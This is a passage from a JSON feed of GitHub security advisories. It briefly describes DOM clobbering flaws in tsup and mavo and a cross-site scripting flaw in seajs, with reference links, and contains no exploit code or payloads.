            "content_html": "<p>A DOM Clobbering vulnerability in tsup v8.3.4 allows attackers to execute arbitrary code via a crafted script in the import.meta.url to document.currentScript in cjs_shims.js components</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-53384\">https://nvd.nist.gov/vuln/detail/CVE-2024-53384</a></li>\n<li><a href=\"https://gist.github.com/jackfromeast/36f98bf7542d11835c883c1d175d9b92\">https://gist.github.com/jackfromeast/36f98bf7542d11835c883c1d175d9b92</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3mv9-4h5g-vhg3\">https://github.com/advisories/GHSA-3mv9-4h5g-vhg3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3mv9-4h5g-vhg3",
            "title": "[tsup] tsup DOM Clobbering vulnerability",
            "date_modified": "2025-03-03T22:22:45.000Z",
            "date_published": "2025-03-03T18:31:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3mv9-4h5g-vhg3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross Site Scripting vulnerability in seajs v.2.2.3 allows a remote attacker to execute arbitrary code via the seajs package</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-51091\">https://nvd.nist.gov/vuln/detail/CVE-2024-51091</a></li>\n<li><a href=\"https://gist.github.com/jackfromeast/176413c3bd73f825f7aeeb05e80e02a6\">https://gist.github.com/jackfromeast/176413c3bd73f825f7aeeb05e80e02a6</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pfr4-4397-3hg8\">https://github.com/advisories/GHSA-pfr4-4397-3hg8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pfr4-4397-3hg8",
            "title": "[seajs] seajs Cross-site Scripting vulnerability",
            "date_modified": "2025-03-03T22:20:22.000Z",
            "date_published": "2025-03-03T18:31:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pfr4-4397-3hg8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A DOM Clobbering vulnerability in mavo v0.3.2 allows attackers to execute arbitrary code via supplying a crafted HTML element.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-53388\">https://nvd.nist.gov/vuln/detail/CVE-2024-53388</a></li>\n<li><a href=\"https://gist.github.com/jackfromeast/a61a5429a97985e7ff4c1d39e339d5d8\">https://gist.github.com/jackfromeast/a61a5429a97985e7ff4c1d39e339d5d8</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3mf5-r4hg-hfx9\">https://github.com/advisories/GHSA-3mf5-r4hg-hfx9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3mf5-r4hg-hfx9",
            "title": "[mavo] mavo DOM Clobbering vulnerability",
            "date_modified": "2025-03-03T22:16:43.000Z",
            "date_published": "2025-03-03T18:31:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3mf5-r4hg-hfx9"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}